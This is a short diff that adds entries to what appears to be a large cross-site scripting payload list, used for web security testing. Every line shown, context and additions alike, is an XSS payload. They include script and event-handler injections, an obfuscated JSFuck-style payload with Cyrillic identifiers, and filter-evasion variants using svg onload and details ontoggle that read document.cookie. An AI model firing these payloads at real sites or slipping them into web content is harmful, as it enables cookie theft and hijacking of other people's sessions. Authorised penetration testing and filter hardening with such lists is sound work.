@@ -2719,3 +2719,11 @@ foo<script>alert(1)</script>
 %22%20onmouseover=alert(document.domain)%20x=%22
 OnXSS=<Img/Src/OnError=(alert)(1)>
 а='',б=!а+а,в=!б+а,г=а+{},д=б[а++],е=б[ж=а], з=++ж+а,и=г[ж+з],б[и+=г[а]+(б.в+г)[а]+в[з]+д+е+б[ж]+и+д+г[а]+е][и](в[а]+в[ж]+б[з]+е+д+"('взломано')")()
+
+.
+.
+"><?/script>"><--<img+src= "><svg/onload?=alert(document.cookie)>> --!>
+.
+"-->""/>0xr3dhunt</script><deTailS open x=">" ontoggle=(co\u006efirm)``>"
+.
+"-->""/>0xr3dhunt</script><deTailS open x=">" ontoggle=(co\u006efirm(document.cookie))``>"
